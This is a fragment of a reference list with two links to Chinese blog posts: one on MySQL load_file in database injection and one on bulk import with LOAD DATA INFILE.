15. [mysql load\_file在数据库注入中使用](https://www.cnblogs.com/blacksunny/p/8060028.html)
16. [MySQL 之 LOAD DATA INFILE 快速导入数据](https://www.cnblogs.com/waynechou/p/7794939.html)

